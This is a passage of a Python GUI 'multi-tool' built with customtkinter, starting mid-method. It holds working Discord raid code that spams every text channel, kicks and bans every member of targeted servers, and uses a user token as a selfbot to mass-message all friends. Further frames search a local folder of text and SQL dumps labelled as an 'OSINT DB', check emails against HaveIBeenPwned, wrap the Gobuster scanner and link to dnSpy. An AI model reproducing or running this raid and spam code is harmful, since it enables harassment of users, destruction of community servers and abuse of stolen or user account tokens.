                    if server_ids is None or str(guild.id) in server_ids:
                        for channel in guild.text_channels:
                            for _ in range(spam_count):
                                await channel.send(spam_message)
                                print(f"Spammed in {channel.name}")

            except ValueError as e:
                self.result_label.configure(text=f"❌ {e}", text_color="red")

            await bot.close()

        try:
            bot.run(token)
        except Exception as e:
            self.result_label.configure(text=f"❌ Error: {e}", text_color="red")

    def run_kick_all_members(self, token, server_ids):
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            self.result_label.configure(text=f"✅ Logged in as {bot.user.name}", text_color="green")

            for guild in bot.guilds:
                if server_ids is None or str(guild.id) in server_ids:
                    for member in guild.members:
                        try:
                            await member.kick(reason="Kicked by bot command.")
                            print(f"Kicked {member.name} from {guild.name}")
                        except discord.Forbidden:
                            print(f"Permission denied for kicking {member.name}")
                            continue

            await bot.close()

        try:
            bot.run(token)
        except Exception as e:
            self.result_label.configure(text=f"❌ Error: {e}", text_color="red")

    def run_ban_all_members(self, token, server_ids):
        bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

        @bot.event
        async def on_ready():
            self.result_label.configure(text=f"✅ Logged in as {bot.user.name}", text_color="green")

            for guild in bot.guilds:
                if server_ids is None or str(guild.id) in server_ids:
                    for member in guild.members:
                        try:
                            await member.ban(reason="Banned by bot command.")
                            print(f"Banned {member.name} from {guild.name}")
                        except discord.Forbidden:
                            print(f"Permission denied for banning {member.name}")
                            continue

            await bot.close()

        try:
            bot.run(token)
        except Exception as e:
            self.result_label.configure(text=f"❌ Error: {e}", text_color="red")

class DmallfriendsFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)

        self.token_label = ctk.CTkLabel(self, text="Discord Token")
        self.token_label.pack(pady=(20, 5))
        self.token_entry = ctk.CTkEntry(self, width=300)
        self.token_entry.pack(pady=5)

        self.message_label = ctk.CTkLabel(self, text="Message to send")
        self.message_label.pack(pady=(20, 5))
        self.message_entry = ctk.CTkEntry(self, width=300)
        self.message_entry.pack(pady=5)

        self.start_button = ctk.CTkButton(self, text="Start DMALL", command=self.start_dmall_friends)
        self.start_button.pack(pady=20)

    def start_dmall_friends(self):
        token = self.token_entry.get()
        message = self.message_entry.get()

        if not token or not message:
            print("Please provide both token and message.")
            return

        # Discord DMALL logic
        import discord

        client = discord.Client()

        @client.event
        async def on_connect():
            user_messaged = 0

            # Loop through friends
            for user in client.user.friends:
                try:
                    await user.send(message)
                    print(f"Message sent to: {user.name}")
                    user_messaged += 1
                except Exception as e:
                    print(f"Error with {user.name}: {str(e)}")
                    pass
            
            print(f"\n\n\n{user_messaged} messages sent")

        # Run the bot
        client.run(token, bot=False)


# --- Classe pour la section OSINT DB ---
class OSINTDBFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master

        self.search_label = ctk.CTkLabel(self, text="Enter search term:", font=("Arial", 16))
        self.search_label.pack(pady=10)

        self.search_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Enter term to search in DB")
        self.search_entry.pack(pady=10)

        self.search_button = ctk.CTkButton(self, text="Search", command=self.run_search, fg_color="#02A9CB", hover_color="#0C758A", corner_radius=8)
        self.search_button.pack(pady=20)

        self.email_label = ctk.CTkLabel(self, text="Check if your email has been pwned:", font=("Arial", 16))
        self.email_label.pack(pady=10)

        self.email_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Enter email to check")
        self.email_entry.pack(pady=10)

        self.check_button = ctk.CTkButton(self, text="Check Email", command=self.check_email_pwned, fg_color="#02A9CB", hover_color="#0C758A", corner_radius=8)
        self.check_button.pack(pady=20)

        self.result_textbox = ctk.CTkTextbox(self, width=800, height=400)
        self.result_textbox.pack(pady=10)

    def run_search(self):
        search_term = self.search_entry.get().strip()

        if not search_term:
            messagebox.showerror("Error", "Please enter a search term.")
            return

        search_dir = r"C:\Users\flipp\Desktop\dev\python\multi-tool\output"
        
        if not os.path.exists(search_dir):
            self.display_results(f"Directory not found: {search_dir}")
            return

        results = []
        try:
            for root, dirs, files in os.walk(search_dir):
                for file in files:
                    if file.endswith(('.txt', '.json', '.sql')):
                        file_path = os.path.join(root, file)
                        with open(file_path, 'r', encoding='utf-8', errors='ignore') as f:
                            lines = f.readlines()
                            for i, line in enumerate(lines, 1):
                                if search_term.lower() in line.lower():
                                    results.append(f"<---|---> Found in {file_path} (line {i}): {line.strip()}")
            
            if results:
                self.display_results("\n".join(results))
            else:
                self.display_results("No results found.")
        except Exception as e:
            self.display_results(f"Error: {e}")

    def check_email_pwned(self):
        email = self.email_entry.get().strip()

        if not email:
            messagebox.showerror("Error", "Please enter an email.")
            return

        try:
            response = requests.get(f"https://haveibeenpwned.com/api/v3/breachedaccount/{email}", headers={"User-Agent": "YourAppName"})
            if response.status_code == 200:
                breaches = response.json()
                results = [f"Email '{email}' has been pwned in the following breaches:"]
                for breach in breaches:
                    results.append(f"- {breach['Name']} (Date: {breach['Date']})")
                self.display_results("\n".join(results))
            elif response.status_code == 404:
                self.display_results(f"Email '{email}' has not been pwned.")
            else:
                self.display_results("Error checking email. Please try again.")
        except Exception as e:
            self.display_results(f"Error: {e}")

    def display_results(self, results):
        self.result_textbox.delete('1.0', ctk.END)
        self.result_textbox.insert(ctk.END, results)



class GobusterFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master
        self.process = None 

        self.url_label = ctk.CTkLabel(self, text="Target URL:", font=("Arial", 16))
        self.url_label.pack(pady=10)

        self.url_entry = ctk.CTkEntry(self, width=400, height=40, placeholder_text="Enter target URL")
        self.url_entry.pack(pady=10)

        self.scan_type_label = ctk.CTkLabel(self, text="Select Scan Type:", font=("Arial", 16))
        self.scan_type_label.pack(pady=10)

        self.scan_type_var = ctk.StringVar(value="Directory") 
        scan_types = ["Directory", "Subdomain"]
        for scan_type in scan_types:
            ctk.CTkRadioButton(self, text=scan_type, variable=self.scan_type_var, value=scan_type).pack(pady=5)

        self.button_frame = ctk.CTkFrame(self)
        self.button_frame.pack(pady=20)

        self.scan_button = ctk.CTkButton(self.button_frame, text="Start Gobuster Scan", command=self.start_scan, width=200, fg_color="#02A9CB", hover_color="#0C758A")
        self.scan_button.pack(side="left", padx=10)

        self.stop_button = ctk.CTkButton(self.button_frame, text="Stop Scan", command=self.stop_scan, width=200, fg_color="#FF6347", hover_color="#FF4500")
        self.stop_button.pack(side="left", padx=10)

        self.install_button = ctk.CTkButton(self.button_frame, text="Install Gobuster", command=self.install_gobuster, width=200, fg_color="#FFA500", hover_color="#FF8C00")
        self.install_button.pack(side="left", padx=10)

        self.result_text = ctk.CTkTextbox(self, width=700, height=600)
        self.result_text.pack(pady=10)

    def start_scan(self):
        ...

    def run_gobuster_scan(self, url, scan_type_choice, wordlist_path):
        ...

    def stop_scan(self):
        ...

    def install_gobuster(self):
        file_path = os.path.join(os.getcwd(), "instructions_gobuster.txt")

        instructions = """\
        Instructions for gobuster installer :

        1. Open a Command Prompt (CMD).
        
        2. Run the following command:
        go install github.com/OJ/gobuster/v3@latest
        
        3. Once installed, you can use Gobuster for your scans.
        """

        with open(file_path, "w") as file:
            file.write(instructions)

        self.result_text.insert(ctk.END, f"✅ instructions written in {file_path}\n")
        self.result_text.see(ctk.END)


class DnspyFrame(ctk.CTkFrame):
    def __init__(self, master):
        super().__init__(master)
        self.master = master
        self.process = None

        self.title_label = ctk.CTkLabel(self, text="Download dnSpy", font=("Arial", 20))
        self.title_label.pack(pady=20)

        self.download_button = ctk.CTkButton(self, text="Download dnSpy", command=self.open_download_link, fg_color="#FFA500", hover_color="#FF8C00")
        self.download_button.pack(pady=20)

        self.documentation_button = ctk.CTkButton(self, text="Documentation", command=self.open_documentation_link, fg_color="#007ACC", hover_color="#005A9E")
        self.documentation_button.pack(pady=20)

    def open_download_link(self):
        download_url = "https://github.com/dnSpy/dnSpy/releases/download/v6.1.8/dnSpy-net-win64.zip"
        webbrowser.open(download_url)

    def open_documentation_link(self):
        documentation_url = "https://github.com/dnSpy/dnSpy"
        webbrowser.open(documentation_url)


if __name__ == "__main__":
    root = ctk.CTk()
    app = MainApp(root)
    root.mainloop()